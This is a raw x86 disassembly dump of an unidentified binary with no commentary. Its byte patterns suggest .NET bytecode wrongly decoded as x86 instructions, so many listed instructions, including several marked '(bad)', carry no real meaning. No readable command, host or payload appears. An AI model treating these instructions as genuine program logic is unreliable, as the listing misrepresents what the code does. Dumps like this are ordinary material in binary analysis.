  4030a9:	03 00                	add    (%eax),%eax
  4030ab:	70 28                	jo     0x4030d5
  4030ad:	1f                   	pop    %ds
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	0a 2b                	or     (%ebx),%ch
  4030b2:	01 17                	add    %edx,(%edi)
  4030b4:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  4030ba:	00 17                	add    %dl,(%edi)
  4030bc:	13 06                	adc    (%esi),%eax
  4030be:	de 42 00             	fiadds 0x0(%edx)
  4030c1:	08 6f 85             	or     %ch,-0x7b(%edi)
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	0a 3a                	or     (%edx),%bh
  4030c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c9:	ff                   	(bad)
  4030ca:	ff                   	(bad)
  4030cb:	ff                   	lcall  (bad)
  4030cc:	de 0b                	fimuls (%ebx)
  4030ce:	08 2c 07             	or     %ch,(%edi,%eax,1)
  4030d1:	08 6f 2d             	or     %ch,0x2d(%edi)
  4030d4:	00 00                	add    %al,(%eax)
  4030d6:	0a 00                	or     (%eax),%al
  4030d8:	dc 00                	faddl  (%eax)
  4030da:	de 0b                	fimuls (%ebx)
  4030dc:	07                   	pop    %es
  4030dd:	2c 07                	sub    $0x7,%al
  4030df:	07                   	pop    %es
  4030e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e1:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4030e6:	dc 00                	faddl  (%eax)
  4030e8:	de 0b                	fimuls (%ebx)
  4030ea:	06                   	push   %es
  4030eb:	2c 07                	sub    $0x7,%al
  4030ed:	06                   	push   %es
  4030ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ef:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4030f4:	dc 00                	faddl  (%eax)
  4030f6:	de 05 26 00 00 de    	fiadds 0xde000026
  4030fc:	00 16                	add    %dl,(%esi)
  4030fe:	13 06                	adc    (%esi),%eax
  403100:	2b 00                	sub    (%eax),%eax
  403102:	11 06                	adc    %eax,(%esi)
  403104:	2a 00                	sub    (%eax),%al
  403106:	00 00                	add    %al,(%eax)
  403108:	01 34 00             	add    %esi,(%eax,%eax,1)
  40310b:	00 02                	add    %al,(%edx)
  40310d:	00 1e                	add    %bl,(%esi)
  40310f:	00 98 b6 00 0b 00    	add    %bl,0xb00b6(%eax)
  403115:	00 00                	add    %al,(%eax)
  403117:	00 02                	add    %al,(%edx)
  403119:	00 15 00 af c4 00    	add    %dl,0xc4af00
  40311f:	0b 00                	or     (%eax),%eax
  403121:	00 00                	add    %al,(%eax)
  403123:	00 02                	add    %al,(%edx)
  403125:	00 0d 00 c5 d2 00    	add    %cl,0xd2c500
  40312b:	0b 00                	or     (%eax),%eax
  40312d:	00 00                	add    %al,(%eax)
  40312f:	00 00                	add    %al,(%eax)
  403131:	00 01                	add    %al,(%ecx)
  403133:	00 df                	add    %bl,%bh
  403135:	e0 00                	loopne 0x403137
  403137:	05 0f 00 00 01       	add    $0x100000f,%eax
  40313c:	1b 30                	sbb    (%eax),%esi
  40313e:	02 00                	add    (%eax),%al
  403140:	22 00                	and    (%eax),%al
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 00                	or     (%eax),%al
  403146:	00 11                	add    %dl,(%ecx)
  403148:	00 16                	add    %dl,(%esi)
  40314a:	0a 00                	or     (%eax),%al
  40314c:	28 55 00             	sub    %dl,0x0(%ebp)
  40314f:	00 0a                	add    %cl,(%edx)
  403151:	6f                   	outsl  %ds:(%esi),(%dx)
  403152:	86 00                	xchg   %al,(%eax)
  403154:	00 0a                	add    %cl,(%edx)
  403156:	12 00                	adc    (%eax),%al
  403158:	28 3b                	sub    %bh,(%ebx)
  40315a:	00 00                	add    %al,(%eax)
  40315c:	06                   	push   %es
  40315d:	26 06                	es push %es
  40315f:	0b de                	or     %esi,%ebx
  403161:	06                   	push   %es
  403162:	26 00 06             	add    %al,%es:(%esi)
  403165:	0b de                	or     %esi,%ebx
  403167:	00 07                	add    %al,(%edi)
  403169:	2a 00                	sub    (%eax),%al
  40316b:	00 01                	add    %al,(%ecx)
  40316d:	10 00                	adc    %al,(%eax)
  40316f:	00 00                	add    %al,(%eax)
  403171:	00 03                	add    %al,(%ebx)
  403173:	00 17                	add    %dl,(%edi)
  403175:	1a 00                	sbb    (%eax),%al
  403177:	06                   	push   %es
  403178:	0f 00 00             	sldt   (%eax)
  40317b:	01 1b                	add    %ebx,(%ebx)
  40317d:	30 02                	xor    %al,(%edx)
  40317f:	00 2b                	add    %ch,(%ebx)
  403181:	00 00                	add    %al,(%eax)
  403183:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403186:	00 11                	add    %dl,(%ecx)
  403188:	00 00                	add    %al,(%eax)
  40318a:	72 09                	jb     0x403195
  40318c:	04 00                	add    $0x0,%al
  40318e:	70 28                	jo     0x4031b8
  403190:	3a 00                	cmp    (%eax),%al
  403192:	00 06                	add    %al,(%esi)
  403194:	0b 12                	or     (%edx),%edx
  403196:	01 28                	add    %ebp,(%eax)
  403198:	87 00                	xchg   %eax,(%eax)
  40319a:	00 0a                	add    %cl,(%edx)
  40319c:	16                   	push   %ss
  40319d:	fe 03                	incb   (%ebx)
  40319f:	0a 06                	or     (%esi),%al
  4031a1:	2c 04                	sub    $0x4,%al
  4031a3:	17                   	pop    %ss
  4031a4:	0c de                	or     $0xde,%al
  4031a6:	0a 16                	or     (%esi),%dl
  4031a8:	0c de                	or     $0xde,%al
  4031aa:	06                   	push   %es
  4031ab:	26 00 16             	add    %dl,%es:(%esi)
  4031ae:	0c de                	or     $0xde,%al
  4031b0:	00 08                	add    %cl,(%eax)
  4031b2:	2a 00                	sub    (%eax),%al
  4031b4:	01 10                	add    %edx,(%eax)
  4031b6:	00 00                	add    %al,(%eax)
  4031b8:	00 00                	add    %al,(%eax)
  4031ba:	01 00                	add    %eax,(%eax)
  4031bc:	22 23                	and    (%ebx),%ah
  4031be:	00 06                	add    %al,(%esi)
  4031c0:	0f 00 00             	sldt   (%eax)
  4031c3:	01 22                	add    %esp,(%edx)
  4031c5:	02 28                	add    (%eax),%ch
  4031c7:	14 00                	adc    $0x0,%al
  4031c9:	00 0a                	add    %cl,(%edx)
  4031cb:	00 2a                	add    %ch,(%edx)
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	00 1b                	add    %bl,(%ebx)
  4031d1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4031d4:	62 00                	bound  %eax,(%eax)
  4031d6:	00 00                	add    %al,(%eax)
  4031d8:	0d 00 00 11 00       	or     $0x110000,%eax
  4031dd:	00 1b                	add    %bl,(%ebx)
  4031df:	8d 0f                	lea    (%edi),%ecx
  4031e1:	00 00                	add    %al,(%eax)
  4031e3:	01 25 16 28 88 00    	add    %esp,0x882816
  4031e9:	00 0a                	add    %cl,(%edx)
  4031eb:	8c 71 00             	mov    %?,0x0(%ecx)
  4031ee:	00 01                	add    %al,(%ecx)
  4031f0:	a2 25 17 28 89       	mov    %al,0x89281725
  4031f5:	00 00                	add    %al,(%eax)
  4031f7:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  4031fd:	00 00                	add    %al,(%eax)
  4031ff:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  403205:	00 00                	add    %al,(%eax)
  403207:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  40320d:	00 00                	add    %al,(%eax)
  40320f:	0a 28                	or     (%eax),%ch
  403211:	78 00                	js     0x403213
  403213:	00 0a                	add    %cl,(%edx)
  403215:	73 79                	jae    0x403290
  403217:	00 00                	add    %al,(%eax)
  403219:	0a 28                	or     (%eax),%ch
  40321b:	7a 00                	jp     0x40321d
  40321d:	00 0a                	add    %cl,(%edx)
  40321f:	8c 5f 00             	mov    %ds,0x0(%edi)
  403222:	00 01                	add    %al,(%ecx)
  403224:	a2 28 8c 00 00       	mov    %al,0x8c28
  403229:	0a 28                	or     (%eax),%ch
  40322b:	2e 00 00             	add    %al,%cs:(%eax)
  40322e:	06                   	push   %es
  40322f:	0a de                	or     %dh,%bl
  403231:	0a 26                	or     (%esi),%ah
  403233:	00 72 21             	add    %dh,0x21(%edx)
  403236:	04 00                	add    $0x0,%al
  403238:	70 0a                	jo     0x403244
  40323a:	de 00                	fiadds (%eax)
  40323c:	06                   	push   %es
  40323d:	2a 00                	sub    (%eax),%al
  40323f:	00 01                	add    %al,(%ecx)
  403241:	10 00                	adc    %al,(%eax)
  403243:	00 00                	add    %al,(%eax)
  403245:	00 01                	add    %al,(%ecx)
  403247:	00 55 56             	add    %dl,0x56(%ebp)
  40324a:	00 0a                	add    %cl,(%edx)
  40324c:	0f 00 00             	sldt   (%eax)
  40324f:	01 13                	add    %edx,(%ebx)
  403251:	30 03                	xor    %al,(%ebx)
  403253:	00 69 00             	add    %ch,0x0(%ecx)
  403256:	00 00                	add    %al,(%eax)
  403258:	0e                   	push   %cs
  403259:	00 00                	add    %al,(%eax)
  40325b:	11 00                	adc    %eax,(%eax)
  40325d:	73 8d                	jae    0x4031ec
  40325f:	00 00                	add    %al,(%eax)
  403261:	0a 0a                	or     (%edx),%cl
  403263:	28 8e 00 00 0a 02    	sub    %cl,0x20a0000(%esi)
  403269:	6f                   	outsl  %ds:(%esi),(%dx)
  40326a:	18 00                	sbb    %al,(%eax)
  40326c:	00 0a                	add    %cl,(%edx)
  40326e:	0b 06                	or     (%esi),%eax
  403270:	07                   	pop    %es
  403271:	6f                   	outsl  %ds:(%esi),(%dx)
  403272:	8f 00                	pop    (%eax)
  403274:	00 0a                	add    %cl,(%edx)
  403276:	0b 73 90             	or     -0x70(%ebx),%esi
  403279:	00 00                	add    %al,(%eax)
  40327b:	0a 0c 00             	or     (%eax,%eax,1),%cl
  40327e:	07                   	pop    %es
  40327f:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  403284:	1f                   	pop    %ds
  403285:	09 11                	or     %edx,(%ecx)
  403287:	04 91                	add    $0x91,%al
  403289:	13 05 08 12 05 72    	adc    0x72051208,%eax
  40328f:	33 04 00             	xor    (%eax,%eax,1),%eax
  403292:	70 28                	jo     0x4032bc
  403294:	91                   	xchg   %eax,%ecx
  403295:	00 00                	add    %al,(%eax)
  403297:	0a 6f 92             	or     -0x6e(%edi),%ch
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 26                	or     (%esi),%ah
  40329e:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4032a1:	58                   	pop    %eax
  4032a2:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4032a5:	04 09                	add    $0x9,%al
  4032a7:	8e 69 32             	mov    0x32(%ecx),%gs
  4032aa:	da 08                	fimull (%eax)
  4032ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ad:	33 00                	xor    (%eax),%eax
  4032af:	00 0a                	add    %cl,(%edx)
  4032b1:	16                   	push   %ss
  4032b2:	1f                   	pop    %ds
  4032b3:	14 6f                	adc    $0x6f,%al
  4032b5:	93                   	xchg   %eax,%ebx
  4032b6:	00 00                	add    %al,(%eax)
  4032b8:	0a 6f 94             	or     -0x6c(%edi),%ch
  4032bb:	00 00                	add    %al,(%eax)
  4032bd:	0a 13                	or     (%ebx),%dl
  4032bf:	06                   	push   %es
  4032c0:	2b 00                	sub    (%eax),%eax
  4032c2:	11 06                	adc    %eax,(%esi)
  4032c4:	2a 00                	sub    (%eax),%al
  4032c6:	00 00                	add    %al,(%eax)
  4032c8:	13 30                	adc    (%eax),%esi
  4032ca:	06                   	push   %es
  4032cb:	00 c4                	add    %al,%ah
  4032cd:	01 00                	add    %eax,(%eax)
  4032cf:	00 0f                	add    %cl,(%edi)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	11 00                	adc    %eax,(%eax)
  4032d5:	73 4d                	jae    0x403324
  4032d7:	00 00                	add    %al,(%eax)
  4032d9:	0a 0a                	or     (%edx),%cl
  4032db:	06                   	push   %es
  4032dc:	72 79                	jb     0x403357
  4032de:	01 00                	add    %eax,(%eax)
  4032e0:	70 6f                	jo     0x403351
  4032e2:	4e                   	dec    %esi
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	0a 72 39             	or     0x39(%edx),%dh
  4032e8:	04 00                	add    $0x0,%al
  4032ea:	70 6f                	jo     0x40335b
  4032ec:	4f                   	dec    %edi
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	0a 00                	or     (%eax),%al
  4032f1:	06                   	push   %es
  4032f2:	72 4f                	jb     0x403343
  4032f4:	04 00                	add    $0x0,%al
  4032f6:	70 6f                	jo     0x403367
  4032f8:	4e                   	dec    %esi
  4032f9:	00 00                	add    %al,(%eax)
  4032fb:	0a 7e 10             	or     0x10(%esi),%bh
  4032fe:	00 00                	add    %al,(%eax)
  403300:	04 6f                	add    $0x6f,%al
  403302:	4f                   	dec    %edi
  403303:	00 00                	add    %al,(%eax)
  403305:	0a 00                	or     (%eax),%al
  403307:	06                   	push   %es
  403308:	72 59                	jb     0x403363
  40330a:	04 00                	add    $0x0,%al
  40330c:	70 6f                	jo     0x40337d
  40330e:	4e                   	dec    %esi
  40330f:	00 00                	add    %al,(%eax)
  403311:	0a 28                	or     (%eax),%ch
  403313:	89 00                	mov    %eax,(%eax)
  403315:	00 0a                	add    %cl,(%edx)
  403317:	6f                   	outsl  %ds:(%esi),(%dx)
  403318:	33 00                	xor    (%eax),%eax
  40331a:	00 0a                	add    %cl,(%edx)
  40331c:	6f                   	outsl  %ds:(%esi),(%dx)
  40331d:	4f                   	dec    %edi
  40331e:	00 00                	add    %al,(%eax)
  403320:	0a 00                	or     (%eax),%al
  403322:	06                   	push   %es
  403323:	72 63                	jb     0x403388
  403325:	04 00                	add    $0x0,%al
  403327:	70 6f                	jo     0x403398
  403329:	4e                   	dec    %esi
  40332a:	00 00                	add    %al,(%eax)
  40332c:	0a 73 7b             	or     0x7b(%ebx),%dh
  40332f:	00 00                	add    %al,(%eax)
  403331:	0a 28                	or     (%eax),%ch
  403333:	7c 00                	jl     0x403335
  403335:	00 0a                	add    %cl,(%edx)
  403337:	6f                   	outsl  %ds:(%esi),(%dx)
  403338:	33 00                	xor    (%eax),%eax
  40333a:	00 0a                	add    %cl,(%edx)
  40333c:	72 69                	jb     0x4033a7
  40333e:	04 00                	add    $0x0,%al
  403340:	70 14                	jo     0x403356
  403342:	6f                   	outsl  %ds:(%esi),(%dx)
  403343:	95                   	xchg   %eax,%ebp
  403344:	00 00                	add    %al,(%eax)
  403346:	0a 72 7d             	or     0x7d(%edx),%dh
  403349:	04 00                	add    $0x0,%al
  40334b:	70 28                	jo     0x403375
  40334d:	96                   	xchg   %eax,%esi
  40334e:	00 00                	add    %al,(%eax)
  403350:	0a 0b                	or     (%ebx),%cl
  403352:	12 01                	adc    (%ecx),%al
  403354:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  40335a:	81 04 00 70 72 8b 04 	addl   $0x48b7270,(%eax,%eax,1)
  403361:	00 70 6f             	add    %dh,0x6f(%eax)
  403364:	95                   	xchg   %eax,%ebp
  403365:	00 00                	add    %al,(%eax)
  403367:	0a 72 97             	or     -0x69(%edx),%dh
  40336a:	04 00                	add    $0x0,%al
  40336c:	70 72                	jo     0x4033e0
  40336e:	a3 04 00 70 6f       	mov    %eax,0x6f700004
  403373:	95                   	xchg   %eax,%ebp
  403374:	00 00                	add    %al,(%eax)
  403376:	0a 28                	or     (%eax),%ch
  403378:	40                   	inc    %eax
  403379:	00 00                	add    %al,(%eax)
  40337b:	0a 6f 4f             	or     0x4f(%edi),%ch
  40337e:	00 00                	add    %al,(%eax)
  403380:	0a 00                	or     (%eax),%al
  403382:	06                   	push   %es
  403383:	72 af                	jb     0x403334
  403385:	04 00                	add    $0x0,%al
  403387:	70 6f                	jo     0x4033f8
  403389:	4e                   	dec    %esi
  40338a:	00 00                	add    %al,(%eax)
  40338c:	0a 28                	or     (%eax),%ch
  40338e:	98                   	cwtl
  40338f:	00 00                	add    %al,(%eax)
  403391:	0a 6f 4f             	or     0x4f(%edi),%ch
  403394:	00 00                	add    %al,(%eax)
  403396:	0a 00                	or     (%eax),%al
  403398:	06                   	push   %es
  403399:	72 b9                	jb     0x403354
  40339b:	04 00                	add    $0x0,%al
  40339d:	70 6f                	jo     0x40340e
  40339f:	4e                   	dec    %esi
  4033a0:	00 00                	add    %al,(%eax)
  4033a2:	0a 7e 03             	or     0x3(%esi),%bh
  4033a5:	00 00                	add    %al,(%eax)
  4033a7:	04 6f                	add    $0x6f,%al
  4033a9:	4f                   	dec    %edi
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	0a 00                	or     (%eax),%al
  4033ae:	06                   	push   %es
  4033af:	72 c9                	jb     0x40337a
  4033b1:	04 00                	add    $0x0,%al
  4033b3:	70 6f                	jo     0x403424
  4033b5:	4e                   	dec    %esi
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	0a 28                	or     (%eax),%ch
  4033ba:	30 00                	xor    %al,(%eax)
  4033bc:	00 06                	add    %al,(%esi)
  4033be:	0b 12                	or     (%edx),%edx
  4033c0:	01 28                	add    %ebp,(%eax)
  4033c2:	97                   	xchg   %eax,%edi
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	0a 6f 7d             	or     0x7d(%edi),%ch
  4033c8:	00 00                	add    %al,(%eax)
  4033ca:	0a 72 d5             	or     -0x2b(%edx),%dh
  4033cd:	04 00                	add    $0x0,%al
  4033cf:	70 72                	jo     0x403443
  4033d1:	c9                   	leave
  4033d2:	04 00                	add    $0x0,%al
  4033d4:	70 6f                	jo     0x403445
  4033d6:	95                   	xchg   %eax,%ebp
  4033d7:	00 00                	add    %al,(%eax)
  4033d9:	0a 72 3d             	or     0x3d(%edx),%dh
  4033dc:	00 00                	add    %al,(%eax)
  4033de:	70 72                	jo     0x403452
  4033e0:	59                   	pop    %ecx
  4033e1:	04 00                	add    $0x0,%al
  4033e3:	70 6f                	jo     0x403454
  4033e5:	95                   	xchg   %eax,%ebp
  4033e6:	00 00                	add    %al,(%eax)
  4033e8:	0a 6f 4f             	or     0x4f(%edi),%ch
  4033eb:	00 00                	add    %al,(%eax)
  4033ed:	0a 00                	or     (%eax),%al
  4033ef:	06                   	push   %es
  4033f0:	72 df                	jb     0x4033d1
  4033f2:	04 00                	add    $0x0,%al
  4033f4:	70 6f                	jo     0x403465
  4033f6:	4e                   	dec    %esi
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	0a 28                	or     (%eax),%ch
  4033fb:	35 00 00 06 6f       	xor    $0x6f060000,%eax
  403400:	4f                   	dec    %edi
  403401:	00 00                	add    %al,(%eax)
  403403:	0a 00                	or     (%eax),%al
  403405:	06                   	push   %es
  403406:	72 f7                	jb     0x4033ff
  403408:	04 00                	add    $0x0,%al
  40340a:	70 6f                	jo     0x40347b
  40340c:	4e                   	dec    %esi
  40340d:	00 00                	add    %al,(%eax)
  40340f:	0a 7e 0e             	or     0xe(%esi),%bh
  403412:	00 00                	add    %al,(%eax)
  403414:	04 6f                	add    $0x6f,%al
  403416:	4f                   	dec    %edi
  403417:	00 00                	add    %al,(%eax)
  403419:	0a 00                	or     (%eax),%al
  40341b:	06                   	push   %es
  40341c:	72 09                	jb     0x403427
  40341e:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403423:	00 00                	add    %al,(%eax)
  403425:	0a 28                	or     (%eax),%ch
  403427:	32 00                	xor    (%eax),%al
  403429:	00 06                	add    %al,(%esi)
  40342b:	6f                   	outsl  %ds:(%esi),(%dx)
  40342c:	4f                   	dec    %edi
  40342d:	00 00                	add    %al,(%eax)
  40342f:	0a 00                	or     (%eax),%al
  403431:	06                   	push   %es
  403432:	72 1d                	jb     0x403451
  403434:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403439:	00 00                	add    %al,(%eax)
  40343b:	0a 28                	or     (%eax),%ch
  40343d:	98                   	cwtl
  40343e:	00 00                	add    %al,(%eax)
  403440:	0a 73 54             	or     0x54(%ebx),%dh
  403443:	00 00                	add    %al,(%eax)
  403445:	0a 28                	or     (%eax),%ch
  403447:	99                   	cltd
  403448:	00 00                	add    %al,(%eax)
  40344a:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40344d:	02 28                	add    (%eax),%ch
  40344f:	9a 00 00 0a 0c 12 02 	lcall  $0x212,$0xc0a0000
  403456:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  40345c:	4f                   	dec    %edi
  40345d:	00 00                	add    %al,(%eax)
  40345f:	0a 00                	or     (%eax),%al
  403461:	06                   	push   %es
  403462:	72 31                	jb     0x403495
  403464:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  403469:	00 00                	add    %al,(%eax)
  40346b:	0a 72 e3             	or     -0x1d(%edx),%dh
  40346e:	00 00                	add    %al,(%eax)
  403470:	70 6f                	jo     0x4034e1
  403472:	4f                   	dec    %edi
  403473:	00 00                	add    %al,(%eax)
  403475:	0a 00                	or     (%eax),%al
  403477:	06                   	push   %es
  403478:	72 3b                	jb     0x4034b5
  40347a:	05 00 70 6f 4e       	add    $0x4e6f7000,%eax
  40347f:	00 00                	add    %al,(%eax)
  403481:	0a 7e 12             	or     0x12(%esi),%bh
  403484:	00 00                	add    %al,(%eax)
  403486:	04 6f                	add    $0x6f,%al
  403488:	4f                   	dec    %edi
  403489:	00 00                	add    %al,(%eax)
  40348b:	0a 00                	or     (%eax),%al
  40348d:	06                   	push   %es
  40348e:	6f                   	outsl  %ds:(%esi),(%dx)
  40348f:	50                   	push   %eax
  403490:	00 00                	add    %al,(%eax)
  403492:	0a 0d 2b 00 09 2a    	or     0x2a09002b,%cl
  403498:	13 30                	adc    (%eax),%esi
  40349a:	02 00                	add    (%eax),%al
  40349c:	1a 00                	sbb    (%eax),%al
  40349e:	00 00                	add    %al,(%eax)
  4034a0:	02 00                	add    (%eax),%al
  4034a2:	00 11                	add    %dl,(%ecx)
  4034a4:	00 28                	add    %ch,(%eax)
  4034a6:	9c                   	pushf
  4034a7:	00 00                	add    %al,(%eax)
  4034a9:	0a 73 9d             	or     -0x63(%ebx),%dh
  4034ac:	00 00                	add    %al,(%eax)
  4034ae:	0a 20                	or     (%eax),%ah
  4034b0:	20 02                	and    %al,(%edx)
  4034b2:	00 00                	add    %al,(%eax)
  4034b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b5:	9e                   	sahf
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	0a 0a                	or     (%edx),%cl
  4034ba:	2b 00                	sub    (%eax),%eax
  4034bc:	06                   	push   %es
  4034bd:	2a 00                	sub    (%eax),%al
  4034bf:	00 1b                	add    %bl,(%ebx)
  4034c1:	30 02                	xor    %al,(%edx)
  4034c3:	00 51 00             	add    %dl,0x0(%ecx)
  4034c6:	00 00                	add    %al,(%eax)
  4034c8:	02 00                	add    (%eax),%al
  4034ca:	00 11                	add    %dl,(%ecx)
  4034cc:	00 00                	add    %al,(%eax)
  4034ce:	7e 0f                	jle    0x4034df
  4034d0:	00 00                	add    %al,(%eax)
  4034d2:	04 28                	add    $0x28,%al
  4034d4:	13 00                	adc    (%eax),%eax
  4034d6:	00 0a                	add    %cl,(%edx)
  4034d8:	2c 07                	sub    $0x7,%al
  4034da:	28 30                	sub    %dh,(%eax)
  4034dc:	00 00                	add    %al,(%eax)
  4034de:	06                   	push   %es
  4034df:	2b 01                	sub    (%ecx),%eax
  4034e1:	16                   	push   %ss
  4034e2:	0a 06                	or     (%esi),%al
  4034e4:	2c 06                	sub    $0x6,%al
  4034e6:	28 40 00             	sub    %al,0x0(%eax)
  4034e9:	00 06                	add    %al,(%esi)
  4034eb:	00 28                	add    %ch,(%eax)
  4034ed:	37                   	aaa
  4034ee:	00 00                	add    %al,(%eax)
  4034f0:	06                   	push   %es
  4034f1:	00 28                	add    %ch,(%eax)
  4034f3:	08 00                	or     %al,(%eax)
  4034f5:	00 06                	add    %al,(%esi)
  4034f7:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  4034fc:	06                   	push   %es
  4034fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4034fe:	9f                   	lahf
  4034ff:	00 00                	add    %al,(%eax)
  403501:	0a 00                	or     (%eax),%al
  403503:	28 06                	sub    %al,(%esi)
  403505:	00 00                	add    %al,(%eax)
  403507:	06                   	push   %es
  403508:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  40350d:	06                   	push   %es
  40350e:	28 a0 00 00 0a 00    	sub    %ah,0xa0000(%eax)
  403514:	00 de                	add    %bl,%dh
  403516:	05 26 00 00 de       	add    $0xde000026,%eax
  40351b:	00 2a                	add    %ch,(%edx)
  40351d:	00 00                	add    %al,(%eax)
  40351f:	00 01                	add    %al,(%ecx)
  403521:	10 00                	adc    %al,(%eax)
  403523:	00 00                	add    %al,(%eax)
  403525:	00 01                	add    %al,(%ecx)
  403527:	00 4a 4b             	add    %cl,0x4b(%edx)
  40352a:	00 05 0f 00 00 01    	add    %al,0x100000f
  403530:	1b 30                	sbb    (%eax),%esi
  403532:	03 00                	add    (%eax),%eax
  403534:	b1 00                	mov    $0x0,%cl
  403536:	00 00                	add    %al,(%eax)
  403538:	10 00                	adc    %al,(%eax)
  40353a:	00 11                	add    %dl,(%ecx)
  40353c:	00 00                	add    %al,(%eax)
  40353e:	72 47                	jb     0x403587
  403540:	05 00 70 28 8a       	add    $0x8a287000,%eax
  403545:	00 00                	add    %al,(%eax)
  403547:	0a 72 4d             	or     0x4d(%edx),%dh
  40354a:	05 00 70 28 40       	add    $0x40287000,%eax
  40354f:	00 00                	add    %al,(%eax)
  403551:	0a 72 79             	or     0x79(%edx),%dh
  403554:	05 00 70 73 a1       	add    $0xa1737000,%eax
  403559:	00 00                	add    %al,(%eax)
  40355b:	0a 0a                	or     (%edx),%cl
  40355d:	00 73 a2             	add    %dh,-0x5e(%ebx)
  403560:	00 00                	add    %al,(%eax)
  403562:	0a 0b                	or     (%ebx),%cl
  403564:	00 06                	add    %al,(%esi)
  403566:	6f                   	outsl  %ds:(%esi),(%dx)
  403567:	80 00 00             	addb   $0x0,(%eax)
  40356a:	0a 6f 81             	or     -0x7f(%edi),%ch
  40356d:	00 00                	add    %al,(%eax)
  40356f:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  403572:	20 08                	and    %cl,(%eax)
  403574:	6f                   	outsl  %ds:(%esi),(%dx)
  403575:	82 00 00             	addb   $0x0,(%eax)
  403578:	0a 0d 00 07 09 72    	or     0x72090700,%cl
  40357e:	b7 05                	mov    $0x5,%bh
  403580:	00 70 6f             	add    %dh,0x6f(%eax)
  403583:	83 00 00             	addl   $0x0,(%eax)
  403586:	0a 6f 33             	or     0x33(%edi),%ch
  403589:	00 00                	add    %al,(%eax)
  40358b:	0a 6f a3             	or     -0x5d(%edi),%ch
  40358e:	00 00                	add    %al,(%eax)
  403590:	0a 00                	or     (%eax),%al
  403592:	00 08                	add    %cl,(%eax)
  403594:	6f                   	outsl  %ds:(%esi),(%dx)
  403595:	85 00                	test   %eax,(%eax)
  403597:	00 0a                	add    %cl,(%edx)
  403599:	2d d8 de 0b 08       	sub    $0x80bded8,%eax
  40359e:	2c 07                	sub    $0x7,%al
  4035a0:	08 6f 2d             	or     %ch,0x2d(%edi)
  4035a3:	00 00                	add    %al,(%eax)
  4035a5:	0a 00                	or     (%eax),%al
  4035a7:	dc 07                	faddl  (%edi)
  4035a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4035aa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4035ab:	00 00                	add    %al,(%eax)
  4035ad:	0a 16                	or     (%esi),%dl
  4035af:	fe 01                	incb   (%ecx)
  4035b1:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4035b4:	04 2c                	add    $0x2c,%al
  4035b6:	09 72 cf             	or     %esi,-0x31(%edx)
  4035b9:	05 00 70 13 05       	add    $0x5137000,%eax
  4035be:	de 2a                	fisubrs (%edx)
  4035c0:	72 d7                	jb     0x403599
  4035c2:	05 00 70 07 6f       	add    $0x6f077000,%eax
  4035c7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4035c8:	00 00                	add    %al,(%eax)
  4035ca:	0a 28                	or     (%eax),%ch
  4035cc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4035cd:	00 00                	add    %al,(%eax)
  4035cf:	0a 13                	or     (%ebx),%dl
  4035d1:	05 de 16 06 2c       	add    $0x2c0616de,%eax
  4035d6:	07                   	pop    %es
  4035d7:	06                   	push   %es
  4035d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4035d9:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  4035de:	dc 26                	fsubl  (%esi)
  4035e0:	00 72 cf             	add    %dh,-0x31(%edx)
  4035e3:	05 00 70 13 05       	add    $0x5137000,%eax
  4035e8:	de 00                	fiadds (%eax)
  4035ea:	11 05 2a 00 00 00    	adc    %eax,0x2a
  4035f0:	01 28                	add    %ebp,(%eax)
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	02 00                	add    (%eax),%al
  4035f6:	35 00 2c 61 00       	xor    $0x612c00,%eax
  4035fb:	0b 00                	or     (%eax),%eax
  4035fd:	00 00                	add    %al,(%eax)
  4035ff:	00 02                	add    %al,(%edx)
  403601:	00 21                	add    %ah,(%ecx)
  403603:	00 77 98             	add    %dh,-0x68(%edi)
  403606:	00 0b                	add    %cl,(%ebx)
  403608:	00 00                	add    %al,(%eax)
  40360a:	00 00                	add    %al,(%eax)
  40360c:	00 00                	add    %al,(%eax)
  40360e:	01 00                	add    %eax,(%eax)
  403610:	a2 a3 00 0b 0f       	mov    %al,0xf0b00a3
  403615:	00 00                	add    %al,(%eax)
